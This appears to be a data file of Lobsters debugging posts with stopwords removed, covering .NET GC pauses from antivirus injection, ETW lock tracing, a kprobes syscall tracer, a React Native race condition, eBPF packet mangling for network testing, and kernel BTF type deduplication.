workstation gc default seen high inefficiency data processing much often window service work like requestprocessing server turned clarizen already tried path everything set properly best result observed background server gc workstation flavour pause hit even half hour clearly high time saw deeper insight gc working perfview rescue started typical overall view gc running etw gconly session hour waiting problem occurrence perfviewexe nogui accepteula merge true gconly collect longgcanalysis recorded session confirmed mysterious pause made even unexplainable long gc pause visible pause time millisecond gcstats report perfview see series slow gc even second ephemeral gc generation take much time abnormal sure question causing event confirming nonsense like long unexplainable wait beginning gc managed thread suspension start gc etw gcrelated event event view perfview moreover markwithtype etw event could notice ridiculous gap time spent mark phase gc markwithtype etw event showing long marking time mark phase looking event various heapnum type revealing delay level several second eventually sum second long overall gc time also note promoted size huge long time could explained traversing abnormally huge heap whole process heap big mentioned earlier decided go even deeper gc analysis get cpu sampling profiling following path described maoni recent never see callstack production blog post perfviewexe nogui accepteula kernelevents memory virtualalloc default onlyproviders norundown nongenrundown noclrrundown merge true zip true collect process processname unfortunately clear reason unable get measurement even try honest expecting see confirmation huge time spend markrelated function gc next step would take memory dump frozen service mysterious gc pause indeed happened side solution fortunately time dmitry rudakov one clarizen engineer able identify issue digging various memory dump taken mysterious pause moreover problem seemed strengthen even process crash happening time great analysis following finding path root cause identification able identify something looked like deadlock inside gc mark phase code gc thread waiting svr tjoin join method within svr gcheap markphase one svr gcheap scandependenthandles called dmitry suspected may caused kind heap corruption confirmed corruption indeed happens verifyheap so command executed severals memory dump taken one crash dump access violation exception caught happened directly inside gc thread within svr gcheap method thus abnormal behaviour lead somehow marking phase gc confirms previous finding moment dmitry identified two possible reason heap corruption oracledataaccessdll orm seems cause problem indeed used diagnosed service similar case found le clearly connect problem library bug background gc antivirus software injecting module job server process suspicion arose observed access violation caused module injected obfuscated someantivirusdll exr ntdll exceptioncode access violation exceptionflags parameter parameter write address k childsp retaddr call ntdll ntdll kernelbase suspicion defined followup action plan quite clear disable background gc machine disable antivirus software observe result disabling background gc disabling concurrent flavour gc setting gcconcurrent flag false config helped entirely problem seemed disappear nonconcurrent gc inefficient typical workload service observed time gc processing time acceptable however least kind confirmation background gc something bug service behaviour background gc disabled marked region disabling antivirus software guess graph change applied clearly since one day issue gone fact completely uninstalling antivirus proper fix excluding net assembly enough please note fix worked even background server gc still running service behaviour antivirus software disabled moment issue considered fixed uninstalling particular antivirus software machine mysterious long gc pause disappeared conclusion gc interesting beast operates vast majority process memory make fragile memory corruption may happen within process word gc cause accessviolation mystery sideeffects fact intensively operating process memory complex concurrent gc flavour intensifies fragility much easier concurrently running thread reveal invalid memory state exactly case considered bug net gc misconfiguration net gc bug bug application code injected module antivirus software creating subtle memory corruption gc innocent victim lot various hypothesis may come revealed way marking gc phase traversing managed heap maybe subtle heap state corruption pushed long processing loop much deeper analysis would probably provide direct answer mystery obviously solution found time investment deeper investigation unjustified interesting aspect gcrelated issue come solving often mix expertise intuition bit luck rarely analysis run straight one planned point another kudos go dmitry rudakov eventually solved issue exactly mix ingredient hope article provide insight attack long gc pause issue happens future see disclaimer purpose obfuscated detail could point specific antivirus software used believe contains major bug revealing everywhere would unfair blame general rather believe subtle combination environment software version used maybe even net framework used reveals bug particular scenario rather blaming particular antivirus software article purpose show attack problem interesting solution may eventually found particular completely related software
246,Lobsters,debugging,Debugging,When Your Profiler Lies,https://randomascii.wordpress.com/2018/12/09/when-your-profiler-lies/,profiler lie,performance consequence inadvertently loading uiforetw stopped recording event flagsfilter odd evidence new trace unpossible lock acquire count correlate wpaexporter make sense observation mystery thing microsoft investigate lock contention post one two three two part reference like,last week wrote performance consequence inadvertently loading process created destroyed high rate week want share technique digging deeper behavior odd thing found trying use first wrote uiforetw noticed inordinate amount size trace recorded coming provider provider record useful information ui hang window active le useful event filling trace buffer crowding interesting one verbose event exclusiveusercrit releaseusercrit sharedusercrit event routinely generating event traffic stopped recording event forgot quite recently funny event record exactly information needed investigating ui hang theoretically practice result looking event mixed remembered existence event added extra user mode provider uiforetw setting dialog flagsfilter specified usercrit event would captured recorded etw trace processcreatetests running without option fourcoreeightthread laptop odd evidence new trace first thing noticed global usercrit critical section lock really hot check count releaseusercrit event process two run processcreatetests conhostexe process acquired released time per test activity process creation phase usually held lock brief time hang observed acquiring critical system lock hundred thousand time per second seems dangerous best createprocesstests launched normally lock never touched child process case lock acquired six time per process process creation phase first sign performance problem happen process destruction unpossible first tracing data seemed show usercrit never acquired test child process process destruction quite surprising considering usercrit reason hang turn usercrit activity shutdown test process entirely attributed unknown process seems like odd etw tracing defect certainly complicated analysis understood going confirmed matching thread id could see usercrit acquired twice per createprocesstests child process process destruction lock acquire count correlate point could see problematic usercrit lock acquired time process creation time process destruction yet time hang observed process destruction continued rabbit lock contention factor often lock acquired long held exclusiveusercrit sharedusercrit event acquiring lock releaseusercrit event field labeled acquireqpccounts holdqpccounts appear record long thread waited acquire lock long held lock time presumably measured queryperformancecounter unit thank anonymous microsoft developer labeled field clearly qpc clock run mhz unit represents microsecond wanted able easily summarize data process name event type found processname column made custom profile genericevents data applied filter event task name containing usercrit would displayed used together wpaexporter export usercrit data specific time range csv file analysis wpaexporter usercrit processcreatetestsetl range profile usercriteventswpaprofile used crude python script summarize data process interest total process system got result two segment run specified held time long releaseusercrit say lock held wait time long exclusiveusercrit sharedusercrit say thread waited could acquire lock process creation duration process processcreatetestsexe held time event wait time eventsprocess conhostexe held time event wait time eventstotals process held time event wait time event process destruction duration process processcreatetestsexe held time event wait time eventsprocess unknown aka processcreatetestsexe held time event wait time eventsprocess conhostexe held time event wait time eventstotals process held time event wait time event according etw event usercrit held time process creation hang observed ever time process destruction lot hang observed always put another way wait time total period implies average hundred thread waiting acquire lock held time implies rarely anybody stopping acquiring lock well make sense wpa screenshot give u another view show something fishy trace zoomed process destruction phase releaseusercrit event selected time usercrit released highlighted vertical blue line clearly see large segment lock released long period time yet despite lack activity sign lock ever held long see multiple process hung msgcheck delay second analysis show hung grab usercrit lock also see releaseusercrit event sorted holdqpccounts imply longest duration usercrit ever held qpc interval m yet see period m releaseusercrit event yet application get lock finally top line holdqpccounts column show sum unit m period shown make sense one piece evidence event saying usercrit available time process destruction piece evidence msgcheckdelay event saying given see mouse hang eye know believe going unfortunately tell either releaseusercrit event incorrectly recording long lock held releaseusercrit event emitted perhaps event emitted somehow lost perhaps due tracing problem process destruction given number context switch occurring call stack look like related usercrit think usercrit event missed reason whatever reason usercrit event appear unreliable thus mostly useless whereas guiprocess event uiforetw record default modest value observation addition contention usercrit process destruction extent process creation phase sometimes serialized different lockresource presumably called hmgrsemaphore based much time spent waiting greacquirehmgrsemaphore lock contention usercrit improved next serializing lock already waiting wing microsoft really want create lot process poking around found guithread guiprocess event trigger process creation process destruction loaded event recorded uiforetw default serve simplest indicator guigdi process destroyed created see lot event probably mean bad day turned filtering event releaseusercrit exclusiveusercrit showed second third biggest contributor trace size nicely justifies default behavior filtering entirely fair processcreatetests stress event heavily totally unfair either note see keyword mask used disable event year ago mystery thing microsoft investigate first lie usercrit etw event attributed unknown process destruction second lie many usercrit event apparently missing perhaps related previous question generic event table option group process name unlike table really needed option let investigate processcreatetests process pointed comment go view editor find queryperformancecounter running mhz lenovo laptop mean using rdtsc directly mean expensive le precise last question blog post lock contention post writing lock lately fought usercrit enough written one two three time hang cause also fought lock protects virtualalloc story two part reference hacker news discussion like like loading related
247,Lobsters,debugging,Debugging,Kernel (kprobes)-based System Call Tracer (2017),https://github.com/bytefire/esct,kernel kprobes based system call tracer,join github today sign file permalink resource reload reload,experimental system call tracer linux kernel based dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time experimental system call tracer proof concept example trace open syscall specified pid using kprobes mechanism extended userspace program specify set syscalls trace module creates two sysfs file syskernelesctpid write pid open syscalls made pid traced syskernelescttrace read file get trace pid specified forkerc quick demo program fork child run l parent pull trace syskernelescttrace writes tmpsyscalltrace compiling directory containing esctc makefile run make c pathtolinuxsource pwd produce esctko insmod compile forker gcc wall forker forkerc first insmod esctko run forker root note note totally experimental hacked together busy weekend improvement made key one module export data using netlink socket rather sysfs file code level might bug done short time experimental system call tracer linux kernel based resource perform action time signed another tab window reload refresh session signed another tab window reload refresh session
248,Lobsters,debugging,Debugging,Debugging a Non Reproducible Crash,https://blog.bam.tech/developper-news/debugging-a-non-reproducible-crash,debugging non reproducible crash,react native oh horror suddenly receiving increased number android crash sentry let reproduce analyzing stacktrace let find another way native navigation reactnativesvg getting bottom finally revelation since version lib thread safe thread safe little theory race condition thread safe case could happen fixing pr reactnative react native,october team release new version react native app happy proud deliver new feature user oh horror hour release suddenly receiving increased number android crash crash reporting tool sentry fire new error type jsapplicationillegalargumentexception error updating property left shadow node type rctview react native usually happen set property wrong type come nt catch error testing app new release well tested every member team panel multiple device also error seem quite random seem happen combination property type shadow node first occurring instance error updating property paddingtop shadow node type rctview error updating property height shadow node type rctimageview error updating property fill view managed rnsvgpath also seems happen device android version based sentry report majority android crash consistent user base let reproduce first step want fix bug reproducing right fortunately thanks sentry log know user triggering crash soooo let see welp vast majority crash user opening app kaboum crash happens okay let try replicate store app installed different android device let try reproduce opening quitting app time luck crashing app impossible reproduce locally dev mode right seems pointless crash seem quite random anyway crash rate raising seems like basically chance app crash starting analyzing stacktrace able reproduce crash let try understand come think well thing mentioned different error similar yet entirely similar stacktraces ok let take first one analyse javalangarrayindexoutofboundsexception simplepoolrelease comfacebookreactbridgedynamicfrommaprecycle comfacebookreactuimanagerlayoutshadownodesetheight javalangreflectmethodinvoke methodjava javalangreflectinvocationtargetexception null javalangreflectmethodinvoke methodjava comfacebookreactbridgejsapplicationillegalargumentexception error updating property height shadow node type rnsvgsvgview comfacebookreactuimanagerviewmanagerspropertycache propsetterupdateshadownodeprop ok happening hmm pretty deep android support library point afraid would take much time investigating want find quickest way fix issue user take time investigate root cause behind bug let find another way another way find root cause bug check new change made release especially change would affect native android code hypothesis emerge upgraded native navigation navigation solution used native fragment android screen upgraded reactnativesvg exception related svg component relation maybe good bet point since reproduce bug best bet downgrading one libs roll user since trivial play store check back user crash happens new release way validate invalidate hypothesis choose library downgrade one solution decide playing head tail really want resolve getting bottom ok let dig deeper stacktrace previously picked see determine library select simple nonsynchronized pool object param pooled type public static class simplepool implement pool private final object mpool private int mpoolsize override public boolean release instance isinpool instance throw new illegalstateexception already pool mpoolsize mpoollength mpool mpoolsize instance mpoolsize return true return false crash occurring error javalangarrayindexoutofboundsexception meaning mpool array size right get addition recycle method place mpoolsize modified acquire method simplepool class public acquire mpoolsize final int lastpooledindex mpoolsize instance mpool lastpooledindex mpool lastpooledindex null mpoolsize return instance return null way mpoolsize hitting line mpoolsize possible condition mpoolsize let put breakpoint android studio check going start app mean condition piece code could malfunction finally revelation see dynamicfrommap static reference simplepool private static final poolssimplepool dynamicfrommap spool new poolssimplepool dozen hit play button carefully placed breakpoints see simplepoolacquire simplepoolrelease called mqtnativemodules thread react native manage style property react component width component also called main thread see used update fill prop main thread typically reactnativesvg component indeed turn reactnativesvg using dynamicfrommap since version lib improve performance native svg animation aaaand function actually called thread dynamicfrommap using simplepool thread safe manner thread safe say nt know term explain next part already know mean feel free skip case could happen thread safe little theory javascript single threaded javascript developer usually need deal thread safety java hand support concept concurrent multithreaded program several thread run within single program potentially access common data structure lead unexpected result let take simple example image thread thread b read integer memory increment value return thread b could potentially access data value thread done updating expected two separate increment result final value potentially get instead scenario final state data depends relative order thread operation called race condition problem race condition nt necessarily happen time possible case thread b work incrementing value giving enough time thread update value explains randomness impossibility reproduce crash data structure said thread safe operation done concurrently many thread without risk race condition one thread performing read particular data element thread allowed modify delete element called atomicity earlier example update cycle atomic race condition would avoided thread b would waited thread complete increment would gone ahead case could happen since dynamicfrommap holding static reference simplepool multiple dynamicfrommap called different thread concurrently call acquire method simplepool image thread calling method evaluating condition true nt yet decreased value mpoolsize shared thread b thread b concurrently calling method already evaluating condition true also separate call would subsequently decrease value mpoolsize get impossible value fixing looking fix found pr reactnative merged making thread safe deployed patched version react native rolling user crash finally fixed hooray finally thanks help janic duplessis react native core contributor mikael sand reactnativesvg maintainer fix included next minor react native bug took u effort fix great opportunity dig deeper reactnative reactnativesvg good debugger well placed breakpoints go long way hope learned something useful well edit french reader check talk subject parisjs
249,Lobsters,debugging,Debugging,Network debugging with eBPF,https://developers.redhat.com/blog/2018/12/03/network-debugging-with-ebpf/,network debugging ebpf,network debugging ebpf rhel introduction ebpf extended bpf red hat enterprise linux problem open vswitch ebpf plethora debugging tracing ebpf help open vswitch fix conclusion bpfilter red hat enterprise linux try ebpf additional resource,network debugging ebpf rhel introduction network fun work often also source trouble network troubleshooting difficult reproducing bad behavior happening field painful well luckily tool come aid network namespaces virtual machine tc netfilter simple network setup reproduced network namespaces veth device morecomplex setup require interconnecting virtual machine software bridge using standard networking tool like iptables tc simulate bad behavior issue icmp reply generated ssh server iptables input p tcp dport j reject rejectwith icmphostunreachable correct namespace vm trick article describes using ebpf extended bpf extended version berkeley packet filter troubleshoot complex network issue ebpf fairly new technology project still early stage documentation sdk yet ready improve especially xdp express data path shipped red hat enterprise linux download run ebpf silver bullet think powerful tool network debugging deserves attention sure play really important role future network problem debugging open vswitch ov network issue affecting complex installation tcp packet scrambled delivered order throughput vms dropping sustained gb oscillating gb analysis turned first tcp packet every connection psh flag set sent order first one one per connection tried replicate setup two vms many man page internet search discovered iptables nftables mangle tcp flag tc could overwrite flag breaking new connection tcp general probably could dealt using combination iptables mark conntrack tc thought could job ebpf ebpf ebpf extended version berkeley packet filter add many improvement bpf notably allows writing memory instead reading also edit packet addition filtering ebpf often referred bpf bpf referred cbpf classic bpf word bpf used represent depending context always referring extended version hood ebpf us simple bytecode vm execute small portion bytecode edit inmemory buffer ebpf come limitation prevent used maliciously cycle forbidden program exit definite time access memory stack scratch buffer kernel function whitelist called loaded program loaded kernel many way plethora debugging tracing case interested ebpf work networking subsystem two way use ebpf program attached via xdp early rx path physical virtual nic attached via tc qdisc like normal action ingres egress order create ebpf program attach enough write c code convert bytecode simple example using xdp sec prog int xdpmain struct xdpmd ctx void dataend void uintptrt ctx dataend void data void uintptrt ctx data struct ethhdr eth data struct iphdr iph struct iphdr eth struct icmphdr icmph struct icmphdr iph sanity check needed ebpf verifier icmph dataend return xdppass matched pong packet eth hproto ntohs ethpip iph protocol ipprotoicmp icmph type icmpechoreply return xdppass iph ttl save old ttl recalculate checksum ttlproto iph ttl oldttlproto ttlproto set ttl pseudorandom number x ttl iph ttl iph ttl recalculate checksum otherwise ip stack drop iph check oldttlproto ttlproto return xdppass char license sec license gpl snippet stripped include statement helper notnecessary code xdp program change ttl received icmp echo reply namely pong random number main function receives struct xdpmd contains two pointer packet start end compile code ebpf bytecode compiler support needed clang support produce ebpf bytecode specifying bpf target compile time clang target bpf c xdpmanglepongc xdpmanglepongo command produce file seems regular object file inspected see reported machine type linux ebpf rather native one o readelf h xdpmanglepongo elf header magic class data complement little endian version current osabi unix system v abi version type rel relocatable file machine linux bpf wrapped regular object file ebpf program ready loaded attached device via xdp done using ip suite using following syntax ip force link set dev xdp object xdpmanglepongo verbose command specified target interface force option overwrite existing ebpf code already loaded loading ebpf bytecode system behavior ping ping byte data byte m byte m byte m byte m byte m byte m byte m byte m byte m byte m ping statistic packet transmitted received packet loss time rtt minavgmaxmdev m every packet received go ebpf eventually transformation decides drop let packet pas ebpf help going back original network issue needed mangle tcp flag one per connection neither iptables tc allow writing c code scenario would easy set two vms linked ov bridge simply attach ebpf one two vm virtual device look like nice solution must take account xdp support handling received packet attaching ebpf rx path receiving vm effect switch properly address ebpf loaded using tc attached egress path within vm tc load attach ebpf program qdisc like action order mangle packet leaving host egress qdisc needed attach ebpf small difference xdp tc api loading ebpf program default section name differs argument main function different structure type returned value different big issue snippet program tcp mangling attached tc action define ratio sec action int bpfmain struct skbuff skb void data void uintptrt skb data void dataend void uintptrt skb dataend struct ethhdr eth data struct iphdr iph struct iphdr eth struct tcphdr tcphdr struct tcphdr iph sanity check needed ebpf verifier void tcphdr dataend return tcactok skip nontcp packet eth hproto constanthtons ethpip iph protocol ipprototcp return tcactok incompatible flag psh already set tcphdr syn tcphdr fin tcphdr rst tcphdr psh return tcactok ratio tcphdr psh return tcactok char license sec license gpl compilation bytecode done xdp example via following clang target bpf c tcppshc tcppsho loading different tc qdisc add dev clsact tc filter add dev egress matchall action bpf objectfile tcppsho point ebpf loaded right place packet leaving vm mangled checking received packet second vm see following tcpdump tnni q device entered promiscuous mode tcpdump verbose output suppressed use v vv full protocol decode listening linktype ethernet capture size byte ip flag seq ack length ip flag seq ack length ip flag seq ack length ip flag p seq ack length ip flag seq ack length ip flag seq ack length ip flag seq ack length ip flag seq ack length ip flag seq ack length ip flag p seq ack length ip flag seq ack length ip flag seq ack length ip flag seq ack length ip flag p seq ack length ip flag seq ack length ip flag seq ack length ip flag seq ack length ip flag p seq ack length ip flag seq ack length ip flag seq ack length ip flag seq ack length ip flag seq ack length ip flag p seq ack length tcpdump confirms new ebpf code working every tcp packet psh flag set line c code selectively mangled tcp packet leaving vm replicating error happened field without recompiling driver without even rebooting simplified lot validation open vswitch fix manner impossible tool conclusion ebpf fairly new technology community strong opinion adoption also worth noting ebpfbased project like bpfilter becoming popular consequence various hardware vendor starting implement ebpf support directly nics ebpf silver bullet abused think powerful tool network debugging deserves attention sure play really important role future network download red hat enterprise linux try ebpf additional resource related
250,Lobsters,debugging,Debugging,Enhancing the Linux kernel with BTF type information,https://facebookmicrosites.github.io/bpf/blog/2018/11/14/btf-enhancement.html,enhancing linux kernel btf type information,tl dr bpf bpf type information bpf safely dwarf bpf type format algorithm algorithm summary string deduplication nonreference type deduplication reference type deduplication type compaction type id fix string deduplication first step type equivalence mapping canonical type pas string deduplication pas nonreference type deduplication candidate type graph canonical type graph must one simple update operation pas reference type deduplication crucial guarantee nonreference type mapped canonical one mapping wo nt change referenced current reference type pas type compaction pas type id fix result next,tl dr work progress bring compact debug type information kernel leveraged bpf get next level term developer experience capability developed algorithm compress dwarf type data compact btf type data making suitable included linux kernel image default bpf type information bpf technology allows unprecedented ability execute custom external code safely inside linux kernel response various eventshooks enables kind application either impossible expensive achieve mean eg lowoverhead profiling tracing rich introspection fast custom packet processing etc bpf technology already capable constantly developed current developer experience exactly walk park yet one way smooth developer experience bpf better introspection debuggability bpf code allow bpf need know bunch metadata information bpf program type information one critical piece metadata necessary bring bpf experience next level eventually metadata enable introspection also much higher level reusability bpf code across different version linux kernel socalled compile run everywhere approach metadata represented normal nonbpf program typically done dwarf debug information problem dwarf though generic expressive make quite complicated verbose format thus unsuitable include linux kernel image due size overhead complexity parsing enter btf bpf type format minimalistic compact format inspired sun ctf compact c type format used representing kernel debug information since solaris btf created similar purpose focus simplicity compactness allow usage linux kernel wo nt describe btf lot detail link get complete information suffice say btf represents type one possible type descriptor identified kind btfkindint btfkindenum btfkindstruct btfkindunion btfkindarray btfkindfwd btfkindptr btfkindconst btfkindvolatile btfkindrestrict might added soon function support depending kind might additional variablesized information available kind type reference type using type id eg int type two type descriptor ptr int type descriptor id position input array descriptor btf type information stored btf elf section contains two part btf type descriptor followed string section diagram give pretty good idea btf type graph show c source code left corresponding btf type graph right type id special represents void implicit first type descriptor btf section type id diagram blog post type id written topleft corner type node type reference marked arrow structsunions obvious diagram field reference type note type node shown two different color green nonreference type red reference distinction explained wellknown within kernel community tool pahole recently updated ability convert dwarf corresponding btf type information straightforward onetoone fashion iterates dwarf type descriptor convert trivially btf type descriptor embeds btf section elf binary simple easy done right unfortunately yet dwarf information emitted compiler compilation unit cu eg cc world single compiled ccpp file independently isolation compilation unit form resulting binary mean dwarf information within single cu describe type referenced directly indirectly eg struct field code within cu primitive type like int long dwarf data cu concatenated linker put resulting binary debuginfo elf section imagine result great duplication type information instance kernel image machine dwarf type data debuginfo section take string debugstr section take another pahole dwarftobtf conversion million btf type descriptor btf type data take string take additional still problem though type hierarchy eg struct type struct reference represented dwarfbtf various degree completeness rather incompleteness due structunion forward declaration let take look example use throughout note better understand problem solution suppose two compilation unit using struct incomplete type information struct field struct struct int struct self struct parent struct b struct struct aptr struct b bptr struct struct struct b int b struct b self struct parent struct struct aptr struct b bptr case cu dwarf subsequently btf data know struct b exists know complete type information struct cu know full type information struct b know forward declaration struct btf term btfkindfwd type descriptor name b compilation unit isolation mean possible single cu complete type information describing structs b also might get ton duplicated redundant type information unfortunately bpf use case going rely btf data important single complete type information per unique type without duplicate incompleteness mean need algorithm would take duplicated potentially incomplete btf information emit nicely deduplicated type information also reconstructing complete type information merging piece different cu btf data embedded linux kernel image readily utilized kernel eg bpf verifier advanced verification scenario well external tooling allow type introspection better debugging capability additional complication need keep mind come fact type general form graph containing cycle dag example type cycle use opportunity better demonstrate subsequent section algorithm work type cycle common real program typical linked list node moderately complex program probably would form much complicated cycle linux kernel struct taskstruct part pretty big connected type graph multiple cycle summary need algorithm deduplicate redundant btf information leave single instance unique type merge reconstruct complete type information across multiple cu handle type cycle correctly efficiently fast reliably become part linux kernel build process note describes one btf deduplication dedup short algorithm algorithm btf dedup algorithm take input inmemory blob representing btf elf section btf type descriptor string data come separately descriptor overwrites memory inplace deduplicated type string without loss information algorithm deduplication also merges resolve type information whenever possible instance example two compilation unit partial type information structs b output algorithm emit single copy btf type describes structs b well type information int pointer defined single compilation unit see diagram visual representation input expected output btf type graph struct int struct self struct parent struct b int b struct b self struct parent struct struct aptr struct b bptr algorithm summary algorithm completes work five separate pass describe briefly detail subsequent section string deduplication deduplicate string data rewrite string offset btf type descriptor simplify string comparison later nonreference type deduplication establish equivalence deduplicate integer enum struct union forward type reference type deduplication deduplicate pointer constvolatilerestrict modifier typedefs array type compaction compact type descriptor leaving unique one type id fix update referenced type id new one established compaction also important idea data structure algorithm relies critical understanding would useful keep mind follow along string deduplication first step btf nt embed string type descriptor instead string concatenated byte array string data separator string referenced type descriptor using offset array typically nameoff field performing string deduplication early avoid comparing string content later string deduplication enough compare corresponding string offset determine string equality save time simplifies code using side array store type equivalence mapping duplicated resolved btf type instead modifying id inplace algorithm performs deduplication type info merging need transform type graph record type equivalence resolve forward declaration structunion type descriptor utilizing separate array store mapping instead updating referenced type id inplace inside affected btf type descriptor performing graph transformation would potentially need n type id rewrite done inplace single value update array crucial idea allow simple efficient btfkindfwd btfkind structunion remapping small price pay need consult array every type id resolution trying get btf type descriptor type id canonical type algorithm determines canonical type descriptor one representative unique type canonical type one go final deduplicated btf type information structunions also type algorithm merge additional type information discovers data cu facilitate fast discovery canonical type also maintain canonical index map type descriptor signature ie kind name size etc list canonical type match signature sufficiently good choice type signature function limit number canonical type unique type signature small number allowing discovery canonical type duplicated type quickly pas string deduplication step pretty selfexplanatory take string section follows btf type descriptor equivalent sort uniq remap nameoff field type descriptor point corresponding deduplicated string reiterate key idea purpose step twofold eliminate duplicate string save space taken string section simplify speed string comparison reducing offset comparison instead strcmp two string need compare corresponding nameoff value note also possible leave string actually referenced btf type descriptor dwarf information generic btf might string dwarf string section referenced kind dwarf data nt care currently pahole blindly copy dwarf string section btf string section without kind filtering leaving string referenced actual btf information save little bit space pas nonreference type deduplication btf type divided two broad category type reference type usually unnamed equivalence determined solely equivalence type referencing instance two btf btfkindptrs equivalent type referencing equivalent btfkindconst btfkindvolatile btfkindrestrict btfkindtypedef btfkindarray also considered reference type addition dimensionality info array index element type determine equivalence two array nonreference type primitive type btfkindint enums btfkindenum obvious case equivalence determined purely structure name bit size signedness set possible value etc structs btfkindstruct union btfkindunion slightly le obvious one might reference type even form type cycle mentioned equivalence determined equivalence entire connected type graph form nevertheless purpose btf deduplication algorithm considered nonreference type processed pas primitive type enums pas go nonreference type deduplicate unlike string deduplication though data yet rewritten copied around unique type determine canonical representative equivalent type would logically replaced output done keeping track equivalence map type canonical type also algorithm consults update canonical index key idea keep track potential canonical candidate type type signature reference type equivalence map yet initialized ignored nonreference type point either type canonical one equivalent type mapping used equivalence check later phase determine type emitted final output set btf type unique canonical type preserved quickly determine potential canonical type algorithm maintains canonical index btf type signature list potential canonical type type signature incorporates key distinguishing factor type name kind size number name member enum struct union hashed together resulting number used lookup key canonical index choosing good hashing function set distinguishing factor significantly reducing number potential candidate need checked complete equivalence greatly speeding processing time type different type signature wo nt even considered list candidate normally either empty type nt seen contain one candidate though due hash collision longer list candidate equivalence check performed differently according particular kind btf type two integer type equivalent name bit size signedness match way different unsigned int instance two enum type equivalent name size set value value name match exactly note without loss generality sake brevity refer structs logic applies union function function added btf treated struct name function corresponds struct name argument field return type special field struct determining equivalence two structs bit involved though course first foremost basic information name size number name field match sufficient two structs equivalent necessary check equivalence entire type graph formed type referenced struct field including indirectly referenced type done traversing graph dfs algorithm keeping track hypothetical equivalence mapping type traversed far one side canonical struct corresponding type graph side candidate struct type graph comparing canonical one hypothetical mapping keep track type candidate type graph equivalent canonical type graph allows u avoid cycle skipping equivalence check type already compared detect conflict contradiction type graph equivalent two different type candidate type graph mapped canonical type contradiction type graph equivalent must true type candidate type graph come single cu one type unique type used cu thus candidate type must map different canonical type opposite nt hold canonical type graph stitched together type coming multiple cu due type merging two different type canonical type graph map single type candidate type graph check proceeds follows start two structs whose equivalence establishing check basic info field countnames equality nt match two structs equivalent candidate field corresponding canonical field check equivalence field type already marked equivalent global equivalence mapping check required type happen two different structs partial overlap type graph already equivalence check another type graph hypothetical mapping already contains canonical type id verify mapping consistent mapped exactly candidate type skip check since already established equivalence previously could happen type graph contains cycle eg struct field pointer canonical type already mapped another type got contradiction thus whole type graph equivalent otherwise add hypothetical mapping canonical candidate type proceed equivalence check either candidate canonical type btfkindfwd kind side struct union function assume equivalent quirk necessary perform forward declaration resolution concrete type eventually reconstruct complete type information otherwise kind candidate canonical differ equivalent enumsinteger type check enuminteger type equivalence described type reference type assume equivalent recursively check equivalence type referencing struct equivalence checked recursively following algorithm step step find type graph equivalent proceed check next candidate canonical type exhausted struct must unique mark global equivalence mapping populate canonical index new entry nt detect contradiction checked reachable type type graph type graph must equivalent going merge hypothetical mapping global equivalence mapping record determined type equivalence avoid performing work later merging hypothetical mapping equivalence mapping need careful skip hypothetical equivalence reference type early determine equivalence yet need wait pas also need merge extra type information candidate canonical type graph remapping btfkindfwd type equivalent struct union function type determined equivalence fwd struct mapping canonical candidate type well candidate canonical one case need adjust equivalence mapping establish relationship updating equivalence mapping fwd type struct type effectively update type cu reference equivalent fwd type point concrete struct type one simple update operation due fact equivalent fwd type resolve canonical fwd type also point corresponding canonical struct type twohop jump equivalence mapping equivalent fwd type resolve canonical struct type consider working example introduction processing cu know full type information struct struct btfkindfwd struct b type type graph marked canonical except pointersconsts processing cu establish type graph struct cu including full type information struct b equivalent canonical type graph struct cu part also establish btfkindfwd struct b cu equivalent full type information struct b cu use relationship complete canonical type graph cu part type graph cu arrive complete merged type graph cu cu picture help explain show state example type graph pas duplicate nonreference type grayed canonical nonreference type bold green dotted line show equivalence mapping dashed line indicate updated type reference resulting deduplication type merging notice pointer yet deduplicated two independent pointer struct fixed next pas struct ptr struct struct b ptr struct pas intricate crucial step overall algorithm end pas nonreference type either identified canonical unique type mapped equivalent canonical type pas reference type deduplication finally ready determine equivalence reference type well pas relies canonical index equivalence mapping used populated nonreference type previous pas except crucial guarantee necessary reference type deduplication nonreference type mapped canonical one mapping wo nt change fact make trivial deduplicate reference type reference type determine canonical type referenced type recursively either already know nonreference type determine following algorithm recursively referenced reference type first necessary determine canonical type referenced type first canonical type id referenced type included type signature reference type eg ptr type signature canonical type id type pointer pointing canonical referenced type iterate potential canonical type current reference type using canonical index check candidate canonical type kind basic information eg typedef ptr const volatile restrict need compare kind array additionally need compare dimensionality mismatch candidate canonical type equivalent canonical type referenced type found equivalence mark updating equivalence mapping otherwise try next candidate candidate equivalent suitable candidate mark current reference type canonical equivalence mapping add canonical index course completing pas example type graph look like one notice struct b field referencing canonical pointer turn referencing struct struct b respectively pas type compaction point know canonical type input type finally time get rid duplicate also going repurpose equivalence mapping array compact type updating corresponding entry equivalence mapping point new compacted type id output data iterate equivalence map type type always void implicit type n skipping noncanonical type mapped type canonical type memmov type information beginning output data block safe filled either duplicate type descriptor nt care anymore worst case contain exact type descriptor trying memmov make noop update corresponding entry equivalence mapping contain new type id equal number compacted type far pas type id fix point input btf type descriptor overwritten deduplicated btf type potentially enhanced additional reconstructed type information problem reference type still referencing type using old type id input data type id longer valid remap new compacted id kept track oldtonew type id mapping previous pas iterate compacted type type reference type rewrite corresponding type id using repurposed equivalence mapping voilà need memmov string data go right btf type descriptor clean freeing supporting data structure point input data contains smaller deduplicated set unique btf type deduplicated array string right forward declaration also resolved specific structunion type duplicated btf data contained enough information infer result ran described algorithm version linux built dwarf debug information performance number preliminary machine took read deduplicate linux btf information number deduplication typesizereduction dwarf type dwarf string btf type btf string number btf deduplication typesizereduction btf type btf string number btf measure impact merging type ran deduplication algorithm type merging special handling btfkindfwd typesizereduction btf type number btf show type reconstructionmerging critical achieving compactness addition removing duplicate partial type next next step project testingverification integrate libbpf make available used tool like pahole bpf verifier done path clear btf information standard part linux kernel enable new exciting feature bpf huge thanks alexei starovoitov introducing nice practical algorithmic problem letting bounce idea also thanks yonghong song helping get started problem quickly painlessly
